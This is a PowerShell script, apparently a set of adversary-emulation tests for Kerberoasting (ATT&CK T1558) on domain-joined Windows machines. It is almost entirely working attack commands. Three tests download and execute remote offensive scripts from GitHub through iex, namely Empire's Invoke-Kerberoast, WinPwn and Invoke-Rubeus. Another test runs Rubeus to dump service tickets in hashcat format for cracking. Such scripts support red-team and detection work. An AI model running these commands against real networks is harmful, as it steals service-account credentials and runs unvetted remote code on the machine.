#T1558 Steal or Forge Kerberos Tickets: Kerberoasting
#Joshua O. Cabauatan
#Pre-req: Computer must be domain joined

#Test 1 - Request for service tickets
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
iex(iwr https://raw.githubusercontent.com/EmpireProject/Empire/08cbd274bef78243d7a8ed6443b8364acd1fc48b/data/module_source/credentials/Invoke-Kerberoast.ps1 -UseBasicParsing)
Invoke-Kerberoast | fl

#Test 2 Rubeus kerberoast
klist purge
cmd.exe /c "$Env:temp\#rubeus.exe" kerberoast #{flags} /outfile:"$Env:temp\rubeus_output.txt"
#Cleanup Command
#Remove-Item $Env:temp\#rubeus.exe\rubeus_output.txt -ErrorAction Ignore

#Test 6 - WinPwn - Kerberoasting
$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
Kerberoasting -consoleoutput -noninteractive

#Test 7 - WinPwn - PowerSharpPack - Kerberoasting Using Rubeus
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Rubeus.ps1')
Invoke-Rubeus -Command "kerberoast /format:hashcat /nowrap"